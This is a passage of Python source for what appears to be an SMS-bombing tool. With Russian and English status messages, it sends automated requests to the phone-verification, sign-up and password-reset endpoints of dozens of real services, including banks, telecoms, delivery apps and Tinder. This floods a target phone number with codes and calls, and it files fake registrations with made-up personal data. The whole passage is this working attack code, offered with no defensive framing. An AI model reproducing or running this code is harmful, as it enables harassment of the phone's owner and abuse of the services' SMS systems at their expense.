        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(' [+] Tinder sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print(' [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print(' [+] Tinkoff отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')
            
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print(' [+] Dostavista отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            print(' [+] MonoBank отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
            print(' [+] SportMaster отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
         
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            print(' [+] Alfalife отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print(' [+] KoronaPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print(' [+] BTfair отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
            print(' [+] GGbet отправлено!')
            time.sleep(0.1)
        except:
            print(' [-]  не отправлено!')
        
        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
            print(' [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print(' [+] TheLive отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
             
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] MTS sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print(' [+] MyGames sent!')
            time.sleep(0.1)
        except:
            print(' [+] error in sent!')
        
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
            print(' [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print(' [+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Kasta Не отправлено!')
            
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
            print(' [+] Mail.ru отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
            print(' [+] Creditter отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
            print(' [+] Ingos отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
            print(' [+] Admiralxxx отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print(' [+] Av отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print(' [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print(' [+] City24 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print(' [+] SushiMaster отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print(' [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
            print(' [+] Niyama отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Niyama не отправлено!')
        
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print(' [+] VSK отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            print(' [+] EasyPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print(' [+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
            print(' [+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            print(' [+] Tele2 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print(' [+] Finam отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")})
            print(' [+] MakiMaki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print(' [+] Online.ua отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print(' [+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,})
            print(' [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
                
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            print(' [+] Smart.Space отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print(' [+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
       
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone})
            print(' [+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",})
            print(' [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print(' [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
            print(' [+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
            print(' [+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print(' [+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
            print(' [+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
       
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print(' [+] Helsi отправлено!')
            time.sleep(0.1)
        except:
            print(' [+] не отправлено!')
        
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
            print(' [+] KinoLend отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print(' [+] PizzaHut sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print(' [+] Rabota sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print(' [+] Rutube sent!')
            time.sleep(0.1)
        except:
            print(' [-] Rutube in sent!')
     
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print(' [+] Citilink sent!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print(' [+] Smsint sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print(' [+] oyorooms sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
            print(' [+] MVIDEO sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print(' [+] newnext sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print(' [+] Sunlight sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print(' [+] alpari sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Invitro sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sberbank sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print(' [+] Psbank sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print(' [+] Beltelcom sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print(' [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print(' [+] KFC sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print(' [+] Yandex.Chef sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print(' [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(' [+] Delitime sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print(' [+] findclone звонок отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
            print(' [+] Guru sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(' [+] ICQ sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print(' [+] InDriver sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print(' [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] Pmsm sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print(' [+] IVI sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print(' [+] Lenta sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(' [+] Mail.ru sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(' [+] MVideo sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
            print(' [+] OK sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print(' [+] qlean sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')
            
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
            print(' [+] Qlean отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print(' [+] SMSgorod sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print(' [+] Tinder sent!')
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(' [+] Twitch sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print(' [+] CabWiFi sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print(' [+] wowworks sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
            print(' [+] Eda.Yandex sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print(' [+] Alpari sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print(' [+] SMS sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print(' [+] Delivery sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

def send_for_number_vip(phone):
        request_timeout = 0.00001
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        _phone='380506691610'
        _phoneNEW=phone[3:]
        _phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
        _phonePozichka = '+'+_phone[0:2]+'-'+_phone[2:5]+'-'+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12] #38-050-669-16-10'
        _phoneQ = '+'+_phone[0:2]+'('+_phone[2:5]+') '+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12] # +38(050) 669 16 10
        _phoneCitrus = '+'+_phone[0:3]+' '+_phone[3:5]+'-'+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12]
        _phoneComfy = '+'+_phone[0:2]+' ('+_phone[2:5]+') '+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12]
        _phone88 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+'-'+_phone[9:11]
        _phone585 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7 (925) 350-99-08

        standar_headers = {'User-Agent':ua}
        
        
        
        
        
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print(' [+] Grab отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print(' [+] chef отправлено!')
        except:
            print(' [-] Не отправлено!') 
            
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print(' [+] lenta отправлено!')
        except:
            print(' [-] Не отправлено!') 
          
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print(' [+] dos отправлено!')
        except:
            print(' [-] Не отправлено!') 
            
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print(' [+] RuTaxi отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print(' [+] BelkaCar отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print(' [+] secure отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print(' [+] planetakino отправлено!')
        except:
            print(' [-] Не отправлено!')    
            
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] pmsm отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print(' [+] ivi отправлено!')
        except:
            print(' [-] Не отправлено!')        
            
            
            
            
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print(' [+] finam отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] mtstv отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print(' [+] games отправлено!')
        except:
            print(' [-] Не отправлено!')   
            
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print(' [+] kasta отправлено!')
        except:
            print(' [-] Не отправлено!')      
            
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print(' [+] ritm отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print(' [+] city24 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Не отправлено!')    
            
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print(' [+] sushi-master отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print(' [+] plex отправлено!')
        except:
            print(' [-] Не отправлено!')    

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print(' [+] vsk отправлено!')
        except:
            print(' [-] Не отправлено!')
            
            
            
            
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone})
            print(' [+] sportmaster отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print(' [+] korona отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print(' [+] btfair отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print(' [+] thehive отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(' [+] Tinder отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print(' [+] Karusel отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print(' [+] Tinkoff отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] MTS отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print(' [+] PizzaHut отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print(' [+] Rabota отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print(' [+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print(' [+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print(' [+] Smsint отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print(' [+] oyorooms отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
            print(' [+] MVideo отправлено!')
        except:
